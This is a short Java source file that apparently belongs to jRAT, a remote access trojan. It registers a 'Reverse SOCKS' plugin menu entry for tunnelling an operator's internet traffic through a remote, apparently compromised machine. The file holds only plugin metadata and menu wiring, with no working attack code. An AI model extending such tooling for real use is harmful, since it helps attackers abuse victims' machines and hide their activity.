package se.jrat.plugin.socks.client;

import jrat.api.Icons;
import jrat.api.Plugin;
import jrat.api.ui.RATMenuItem;

public class SocksPlugin extends Plugin {
	
	public SocksPlugin() {
		super("Reverse SOCKS", "1.2", "Connect to internet through remote machine", "jRAT", Icons.getIcon("Reverse SOCKS", "/icons/icon.png"));
	
		RATMenuItem entry = new RATMenuItem(new MenuListener(), "Reverse SOCKS", icon);
		RATMenuItem.addItem(entry);
	}

}
